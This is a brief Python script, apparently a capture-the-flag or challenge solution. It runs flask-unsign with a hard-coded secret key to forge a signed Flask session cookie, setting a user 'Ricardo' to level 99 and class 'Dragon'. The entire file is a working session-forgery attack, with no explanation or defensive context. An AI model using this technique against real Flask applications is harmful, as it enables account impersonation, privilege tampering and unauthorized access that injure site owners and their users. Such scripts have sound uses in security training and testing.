import subprocess

session = {'user': {'classType': 'Dragon', 'exp': 0, 'level': 99, 'username': 'Ricardo'}}
secret = b'_5#y2L"F4Q8z\n\xec]/'


result = subprocess.run(['flask-unsign', '--sign', '--cookie', f'{session}', '--secret', f'{secret}'], stdout=subprocess.PIPE)
print(result.stdout.decode())